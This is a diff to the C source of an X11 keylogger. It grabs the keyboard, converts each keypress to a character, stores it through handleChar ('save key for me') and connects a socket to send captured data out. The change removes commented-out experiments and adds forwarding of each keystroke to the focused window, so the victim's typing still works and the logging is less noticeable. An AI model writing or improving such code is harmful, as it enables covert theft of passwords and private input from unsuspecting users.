@@ -60,6 +60,8 @@ int main() {
 
 	grab(dpy);
 
+	unsigned long serial = 0;
+
 	int i = 0;
 	while(i < KEYLOGNUM) {
 
@@ -68,44 +70,18 @@ int main() {
 			if( (connected = connectSocket()) )
 				sendMissingStuff();
 
-		//printf("\nQueuedAlready: %i, Pending: %i\n", XEventsQueued(dpy, QueuedAlready), XPending(dpy));
-
-		// get next event
-		// XPeekEvent / XNextEvent
-		/*if( XPending(dpy) == 0 ) {
-			//grab(dpy);
-			XPeekEvent(dpy, &event);
-			exit(0);
-		} else {
-			ungrab(dpy);
-			XSync(dpy, 1);
-			continue;
-		}*/
-
 		XNextEvent(dpy, &event);
-
-		/*XKeyEvent kp;
-		kp.window = DefaultRootWindow(dpy);
-		kp.state = ControlMask;
-		kp.keycode = XKeysymToKeycode (dpy, XK_Page_Down);
-		kp.type = KeyPress;
-		XSendEvent (dpy, kp.window, False, KeyPressMask, (XEvent *)(&kp));*/
-		//XPutBackEvent(dpy, &event);
-		//XAllowEvents(dpy, ReplayKeyboard, event.xkey.time);
-		//XTestFakeKeyEvent(dpy, event.xkey.keycode, 1, CurrentTime);
-		//XFlush(dpy);
-		//XSync(dpy, False);
-		//XSendEvent(dpy, DefaultRootWindow(dpy), True, KeyPressMask, &event);
-		//XSync(dpy, False);
-
-		//int keycode = event.xkey.keycode;
 
 		// convert keycode to character
 		if( (len = XLookupString(&event.xkey, buf, 1, &keysym, NULL)) == 0 )
 			buf[0] = '\0';
 
 		if(event.type == KeyPress) {
+			// save key for me
 			handleChar(connected, buf, keysym);
+
+			// but still report it to client
+			sendKeyToFocus(dpy, buf);
 		}
 
 		//printf("\n%lu\n", event.xany.serial);
